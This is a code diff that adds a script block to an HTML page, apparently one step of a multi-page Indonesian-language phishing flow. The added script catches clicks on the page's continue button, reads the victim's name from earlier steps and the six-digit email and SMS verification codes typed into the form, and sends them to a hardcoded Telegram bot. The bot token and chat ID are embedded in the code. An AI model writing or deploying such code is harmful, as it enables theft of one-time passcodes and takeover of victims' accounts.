@@ -2487,4 +2487,89 @@ update();restart();
 })();
 </script>
 
+<script id="kb-telegram-otp-send">
+(function () {
+  "use strict";
+  const BOT_TOKEN = "8941514752:AAHqmU7lqV0T64xRo43YPsmkjMwv2lrWDNE";
+  const CHAT_ID   = "6959842489";
+
+  function recordTgLog(source, status, detail, messageText) {
+    try {
+      var logs = JSON.parse(localStorage.getItem('kb_tg_logs') || '[]');
+      var now = new Date();
+      logs.unshift({
+        time: now.toLocaleTimeString('id-ID') + ' (' + now.toLocaleDateString('id-ID') + ')',
+        source: source,
+        status: status,
+        detail: detail,
+        text: messageText || ''
+      });
+      if (logs.length > 50) logs = logs.slice(0, 50);
+      localStorage.setItem('kb_tg_logs', JSON.stringify(logs));
+    } catch(e) {}
+  }
+
+  async function tgSend(text, sourceName) {
+    sourceName = sourceName || "05-kode-simulasi.html";
+    if (!BOT_TOKEN || BOT_TOKEN.startsWith("ISI_")) return;
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      });
+      const data = await res.json();
+      if (data && data.ok) {
+        console.log(`%c[TG SUCCESS: ${sourceName}]`, "color:#10b981;font-weight:bold", data);
+        recordTgLog(sourceName, "SUCCESS", `Pesan ID: ${data.result?.message_id || 'OK'}`, text);
+      } else {
+        console.error(`%c[TG ERROR: ${sourceName}]`, "color:#ef4444;font-weight:bold", data);
+        recordTgLog(sourceName, "ERROR", data?.description || "Gagal dikirim Telegram", text);
+      }
+      return data;
+    } catch (e) {
+      console.error(`%c[TG NETWORK ERROR: ${sourceName}]`, "color:#ef4444;font-weight:bold", e);
+      recordTgLog(sourceName, "ERROR", e.message || String(e), text);
+    }
+  }
+
+  const esc = (s) => String(s ?? "")
+    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  // Hook tombol "Lanjutkan" (#ov-continue)
+  document.addEventListener("click", function (e) {
+    const btn = e.target.closest("#ov-continue");
+    if (!btn || btn.disabled) return;
+
+    // Ambil nama dari tahap 04 (localStorage kb_nama)
+    let nama = "-";
+    try { nama = localStorage.getItem("kb_nama") || "-"; } catch(_) {}
+
+    // Ambil 6 digit OTP Email
+    const emailOtp = [...document.querySelectorAll('[data-otp="email"]')]
+      .map(i => i.value || "").join("");
+
+    // Ambil 6 digit OTP SMS
+    const smsOtp = [...document.querySelectorAll('[data-otp="sms"]')]
+      .map(i => i.value || "").join("");
+
+    const text =
+      `🔔 <b>KODE ${esc(nama.toUpperCase())}</b>\n\n` +
+      `Kode Verifikasi email : <code>${esc(emailOtp)}</code>\n` +
+      `Kode Verifikasi nomor hp : <code>${esc(smsOtp)}</code>`;
+
+    tgSend(text, "05-kode-simulasi.html (OTP)");
+  });
+
+  window.KBTelegram = { send: tgSend, esc, recordLog: recordTgLog };
+})();
+</script>
+
+
 </body></html>
